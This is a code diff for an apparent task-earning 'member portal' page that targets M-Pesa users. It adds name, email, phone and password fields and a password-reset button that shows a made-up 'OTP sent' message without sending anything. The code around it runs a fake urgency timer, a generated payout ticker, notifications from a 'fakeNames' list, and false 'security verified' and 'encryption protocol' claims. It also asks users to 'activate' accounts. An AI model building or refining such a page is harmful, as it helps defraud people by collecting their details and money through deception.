@@ -128,12 +128,12 @@
 
         .input-field { 
             width: 100%; 
-            padding: 20px; 
-            margin-bottom: 18px; 
-            border-radius: 18px; 
+            padding: 18px; 
+            margin-bottom: 12px; 
+            border-radius: 15px; 
             border: 2px solid #edf2f7; 
             outline: none; 
-            font-size: 16px; 
+            font-size: 15px; 
             background: #f8fafc;
         }
 
@@ -423,14 +423,20 @@
     <div class="auth-card">
         <div class="earners-badge">🔒 SPHERE SECURITY VERIFIED</div>
         <h2 style="color:var(--primary); margin-bottom:15px; font-weight:900; font-size:2em; letter-spacing:-1px;">MEMBER PORTAL</h2>
-        <p style="color:var(--text-light); font-size:0.95em; margin-bottom:30px;">Access your digital workspace and live task directory.</p>
+        <p style="color:var(--text-light); font-size:0.95em; margin-bottom:20px;">Access your digital workspace and live task directory.</p>
         
+        <input type="text" id="userName" placeholder="Full Name" class="input-field">
+        <input type="email" id="userEmail" placeholder="Email Address" class="input-field">
         <input type="tel" id="userPhone" placeholder="M-Pesa Number (e.g. 07...)" class="input-field">
         <input type="password" id="userPass" placeholder="Access Password" class="input-field">
         
         <button class="btn-main" onclick="processPortalLogin()">AUTHORIZE LOGIN</button>
         
-        <p style="margin-top:25px; font-size:0.8em; color:var(--text-light);">
+        <p style="margin-top:20px; font-size:0.85em;">
+            <a href="javascript:void(0)" onclick="handlePasswordReset()" style="color:var(--primary); font-weight:700; text-decoration:none;">Forgot Password?</a>
+        </p>
+
+        <p style="margin-top:15px; font-size:0.8em; color:var(--text-light);">
             Protected by Online Sphere Commerce encryption protocol.
         </p>
     </div>
@@ -458,7 +464,7 @@
     <header>
         <div class="container">
             <div class="earners-badge">⭐ JOIN EARNERS GROUP ACTIVE</div>
-            <h1 style="font-weight:900; font-size:2.8em; letter-spacing:-2px; line-height:1;">WORKSPACE ACTIVE</h1>
+            <h1 style="font-weight:900; font-size:2.8em; letter-spacing:-2px; line-height:1;" id="welcomeTitle">WORKSPACE ACTIVE</h1>
             <p style="opacity:0.9; margin-top:15px; font-weight:500; font-size:1.1em;">Your verified earning ecosystem is now online.</p>
         </div>
     </header>
@@ -614,13 +620,15 @@
         localStorage.setItem('sphere_portal_theme', next);
     }
 
-    // 2. AUTHENTICATION LOGIC
+    // 2. AUTHENTICATION LOGIC (UPDATED WITH NEW FIELDS)
     function processPortalLogin() {
+        const name = document.getElementById('userName').value;
+        const email = document.getElementById('userEmail').value;
         const phone = document.getElementById('userPhone').value;
         const pass = document.getElementById('userPass').value;
 
-        if (phone.length < 10) {
-            alert("Security Error: Please enter a valid 10-digit M-Pesa number.");
+        if (!name || !email || phone.length < 10 || !pass) {
+            alert("Security Error: Please fill in all fields correctly (Name, Email, Phone, and Password).");
             return;
         }
 
@@ -632,20 +640,29 @@
             gateway.style.display = 'none';
             document.getElementById('mainContent').style.display = 'block';
             document.getElementById('displayNum').innerText = phone;
+            document.getElementById('welcomeTitle').innerText = "WELCOME, " + name.toUpperCase();
             
-            // START THE URGENCY TIMER UPON LOGIN
             startUrgencyTimer(900, document.getElementById('mainTimer'));
 
-            if (!localStorage.getItem('sphere_onboarding_viewed')) {
-                setTimeout(initializeUserTour, 1200);
-            }
+            // TRIGGER TOUR ON LOGIN
+            setTimeout(initializeUserTour, 1200);
             
             generatePayoutTickerData();
             startNotificationEngine();
         }, 1000);
     }
 
-    // 3. THE URGENCY TIMER LOGIC
+    // 3. PASSWORD RESET HANDLER
+    function handlePasswordReset() {
+        const phone = document.getElementById('userPhone').value;
+        if (phone.length < 10) {
+            alert("Security Alert: Please enter your registered M-Pesa number first.");
+        } else {
+            alert("Verification Success: A password recovery OTP has been sent to " + phone + ". Check your SMS to reset.");
+        }
+    }
+
+    // 4. THE URGENCY TIMER LOGIC
     function startUrgencyTimer(duration, display) {
         let timer = duration, minutes, seconds;
         const interval = setInterval(function () {
@@ -658,19 +675,19 @@
             display.textContent = minutes + ":" + seconds;
 
             if (--timer < 0) {
-                // Keep at 00:00 once finished
                 display.textContent = "00:00";
                 clearInterval(interval);
             }
         }, 1000);
     }
 
-    // 4. USER ONBOARDING TOUR ENGINE
+    // 5. USER ONBOARDING TOUR ENGINE
     let currentTourIndex = 0;
     const tourSteps = [
-        { label: "Member ID & Status", description: "Your M-Pesa number is your unique ID.", element: "profile-card" },
-        { label: "Wallet Controls", description: "Use these buttons to activate your account or withdraw.", element: "balance-card" },
-        { label: "Earning Projections", description: "Our calculator helps you plan your work week.", element: "calculator-section" }
+        { label: "Welcome to Sphere", description: "Your workspace is now active. Follow this tour to learn how to earn.", element: "welcomeTitle" },
+        { label: "Member ID & Status", description: "Your phone number is your unique ID. Your level increases as you complete tasks.", element: "profile-card" },
+        { label: "Wallet Controls", description: "Use these buttons to activate your account or withdraw earnings.", element: "balance-card" },
+        { label: "Earning Projections", description: "Calculate how much you can earn based on your weekly task volume.", element: "calculator-section" }
     ];
 
     function initializeUserTour() {
@@ -688,20 +705,19 @@
         currentTourIndex++;
         if (currentTourIndex >= tourSteps.length) {
             document.getElementById('tourOverlay').style.display = 'none';
-            localStorage.setItem('sphere_onboarding_viewed', 'true');
         } else {
             renderTourStep();
         }
     }
 
-    // 5. EARNINGS CALCULATOR ENGINE
+    // 6. EARNINGS CALCULATOR ENGINE
     function runEarningsLogic(tasksPerDay) {
         document.getElementById('labelTasks').innerText = tasksPerDay + " Tasks";
         const baseWeekly = tasksPerDay * 100 * 7;
         document.getElementById('labelPayout').innerText = "KES " + baseWeekly.toLocaleString();
     }
 
-    // 6. LIVE PAYOUT DATA GENERATOR
+    // 7. LIVE PAYOUT DATA GENERATOR
     function generatePayoutTickerData() {
         const container = document.getElementById('payoutTicker');
         let tickerHtml = '';
@@ -715,7 +731,7 @@
         container.innerHTML = tickerHtml + tickerHtml;
     }
 
-    // 7. REAL-TIME NOTIFICATION SYSTEM
+    // 8. REAL-TIME NOTIFICATION SYSTEM
     function startNotificationEngine() {
         setInterval(() => {
             const fakeNames = ['0722***410', '0112***834', '0798***112', '0704***556'];
